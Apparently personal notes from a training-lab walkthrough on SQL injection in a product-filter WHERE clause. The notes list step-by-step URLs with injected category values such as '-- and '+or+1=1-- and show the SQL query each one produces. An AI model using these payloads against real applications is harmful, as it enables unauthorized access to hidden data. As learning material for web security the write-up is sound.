# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## SELECT \* FROM products WHERE category = 'Gifts' AND released = 1

## SELECT \* FROM products WHERE category = 'Pets' AND released = 1

## To solve the lab, perform a SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

### https://0a0700ad03ead4f6c19417ec006e0036.web-security-academy.net/filter

### step1

### https://0a0700ad03ead4f6c19417ec006e0036.web-security-academy.net/filter?category=Pets

### step2

### https://0a0700ad03ead4f6c19417ec006e0036.web-security-academy.net/filter?category='

### step3

### https://0a0700ad03ead4f6c19417ec006e0036.web-security-academy.net/filter?category='--

### step4

### https://0a0700ad03ead4f6c19417ec006e0036.web-security-academy.net/filter?category='or1=1--

or

### https://0a0700ad03ead4f6c19417ec006e0036.web-security-academy.net/filter?category='+or+1=1--

> notes => https://0a0700ad03ead4f6c19417ec006e0036.web-security-academy.net/filter?category='
> the above example will passed into database

```sql
 SELECT * FROM products WHERE category = ''' AND released = 1
```

> https://0a0700ad03ead4f6c19417ec006e0036.web-security-academy.net/filter?category='--

```sql
SELECT * FROM products WHERE category = ''--' AND released = 1
```

> https://0a0700ad03ead4f6c19417ec006e0036.web-security-academy.net/filter?category='or1=1--

```sql
SELECT * FROM products WHERE category = ''or1=1--' AND released = 1
```
